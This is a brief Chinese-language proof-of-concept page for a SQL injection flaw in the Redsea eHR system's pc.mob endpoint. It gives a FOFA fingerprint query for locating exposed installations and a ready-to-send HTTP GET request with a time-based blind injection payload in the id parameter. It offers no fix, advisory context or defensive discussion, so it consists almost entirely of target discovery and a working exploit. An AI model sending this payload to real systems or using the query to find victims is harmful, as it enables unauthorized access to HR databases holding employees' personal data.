# 红海云eHR系统pc.mob存在sql注入漏洞

红海云eHR系统pc.mob存在sql注入漏洞

## fofa

```yaml
body="/RedseaPlatform/skins/images/favicon.ico"
```

## poc

```java
GET /RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SELECT(SLEEP(5)))ndMq)%20AND%20%27NEoX%27=%27NEoX HTTP/1.1
Host: {{Hostname}}
Cookie: JSESSIONID=905D36CF9349B41FBFB0203D2BAA8CCC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
```

